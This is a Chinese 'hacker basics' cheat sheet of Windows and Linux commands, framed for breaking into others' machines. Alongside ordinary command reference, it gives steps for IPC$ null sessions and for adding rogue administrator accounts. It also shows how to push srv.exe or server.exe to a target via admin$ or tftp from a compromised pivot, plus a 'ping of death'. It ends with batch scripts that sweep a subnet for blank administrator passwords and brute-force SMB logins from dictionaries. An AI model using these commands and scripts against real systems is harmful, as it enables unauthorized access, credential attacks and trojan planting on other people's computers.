# 黑客基础之DOS
net use $">\\ip\ipc$ " " /user:" " 建立IPC空链接

net use $">\\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接

net use h: $">\\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:

net use h: $">\\ip\c$ 登陆后映射对方C：到本地为H:

net use $">\\ip\ipc$ /del 删除IPC链接

net use h: /del 删除映射对方到本地的为H:的映射

net user用户名 密码 /add 建立用户

net userguest /active:yes 激活guest用户

net user查看有哪些用户

net user 帐户名 查看帐户的属性

net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数

 

net start 查看开启了哪些服务

net start 服务名 开启服务；(如:

net start telnet， net start schedule)

net stop 服务名 停止某服务 net time \\目标ip 查看对方时间

net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息

 

net view 查看本地局域网内开启了哪些共享

net view \\ip 查看对方局域网内开启了哪些共享

net config 显示系统网络设置

net logoff 断开连接的共享

net pause 服务名 暂停某服务

 

net send ip "文本信息" 向对方发信息

net ver 局域网内正在使用的网络连接类型和信息

net share 查看本地开启的共享

net share ipc$ 开启ipc$共享

net share ipc$ /del 删除ipc$共享

net share c$ /del 删除C：共享

net user guest 12345 用guest用户登陆后用将密码改为12345

net password 密码 更改系统登陆密码

netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）

netstat -s 查看正在使用的所有协议使用情况

nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写

tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。

ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)

ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息

tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件 del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）

move 盘符\路径\要移动的文件名 存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令

 

at id号 开启已注册的某个计划任务

at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止

at id号 /delete 停止某个已注册的计划任务

at 查看所有的计划任务

at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机

finger username @host 查看最近有哪些用户登陆 telnet ip 端口 远和登陆服务器,默认端口为23 open ip 连接到IP（属telnet登陆后的命令） telnet 在本机上直接键入

telnet 将进入本机的telnet copy 路径\文件名1 路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 copy c:\srv.exe $">\\ip\admin$ 复制本地c:\srv.exe到对方的admin下 cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件

copy $\svv.exe">\\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：

xcopy 要复制的文件或目录树 目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件

tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 tftp -i 对方IP put c:\server.exe 登陆后，上传本地c:\server.exe至主机

ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) route print显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway

addres，接口地址

Interface arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。

arp -a将显示出全部信息 start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况

attrib 文件名(目录名) 查看某文件（目录）的属性

attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性

dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间

set 指定环境变量名称=要指派给变量的字符 设置环境变量 set 显示当前所有的环境变量 set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量

pause 暂停批处理程序，并显示出：请按任意键继续.... if 在批处理程序中执行条件处理（更多说明见if命令及变量） goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）

call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件

title 标题名字 更改CMD窗口标题名字

color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白

prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )

print 文件名 打印文本文件

ver 在DOS窗口下显示版本信息

winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）

format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS

md 目录名 创建目录

 replace 源文件 要替换文件的目录 替换文件

 ren 原文件名 新文件名 重命名文件名

 tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称

 type 文件名 显示文本文件的内容

 more 文件名 逐屏显示输出文件

 doskey 要锁定的命令＝字符 doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=

 taskmgr 调出任务管理器

 chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误

 tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口

 exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe

path 路径\可执行文件的文件名 为可执行文件设置一个路径。

cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?

regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；

regedit /e 注册表文件名 导出注册表 cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 cacls 文件名 查看文件的访问用户权限列表 REM 文本内容 在批处理文件中添加注解 netsh 查看或更改本地网络配置情况

 

 IIS服务命令： iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） iisreset /start或stop 启动（停止）所有Internet服务 iisreset /restart 停止然后重新启动所有Internet服务 iisreset /status 显示所有Internet服务状态 iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。



 win2003系统下新增命令（实用部份）：

shutdown /参数 关闭或重启本地或远程主机。 参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 例：shutdown /r /t 0 立即重启本地主机（无延时） taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 

 

 tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。

 

 ## Linux系统下基本命令：

 要区分大小写
`uname` 显示版本信息（同win2K的 ver）

 dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）  

 pwd 查询当前所在的目录位置

`cd ..`回到上一层目录，注意cd 与..之间有空格。
`cd /`返回到根目录。

 cat 文件名 查看文件内容 cat >abc.txt 往abc.txt文件中写上内容。

 more 文件名 以一页一页的方式显示一个文本文件。

 cp 复制文件 mv 移动文件 rm 文件名 删除文件，rm -a 目录名删除目录及子目录

 mkdir 目录名 建立目录 rmdir 删除子目录，目录内没有文档。 chmod 设定档案或目录的存取权限 grep 在档案中查找字符串 diff 档案文件比较 find 档案搜寻 date 现在的日期、时间

 who 查询目前和你使用同一台机器的人以及Login时间地点 w 查询目前上机者的详细资料 whoami 查看自己的帐号名称 groups 查看某人的Group passwd 更改密码 history 查看自己下过的命令 ps 显示进程状态 kill 停止某进程 gcc 黑客通常用它来编译C语言写的文件 su 权限转换为指定使用者

 telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 ftp ftp连接上某服务器（同win2K）

 

## 批处理命令与变量

 1：for命令及变量 基本格式： 
FOR /参数 %variable IN (set) DO command [command_parameters] 

%variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。
批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：
net use $">\\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 

(set):指定一个或一组文件，可使用通配符，如：
(D:\user.txt)和(1 1 254)(1 -1 254),{“(1 1 254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1} command：指定对第个文件执行的命令，如：
net use命令；如要执行多个命令时，命令这间加：& 来隔开 

command_parameters：为特定命令指定参数或命令行开关 IN (set)：指在(set)中取值；DO command ：指执行command 参数：/L 指用增量形式{(set)为增量形式时}；/F 指从文件中不断取值，直到取完为止{(set)为文件时，如(d:\pass.txt)时}。 用法举例：
 @echo off echo 用法格式：
 test.bat *.*.* > test.txt for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:administrator | find "命令成功完成" >>test.txt 
 存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。 /L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。
 
 @echo off echo 用法格式：ok.bat ip FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200 存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。

 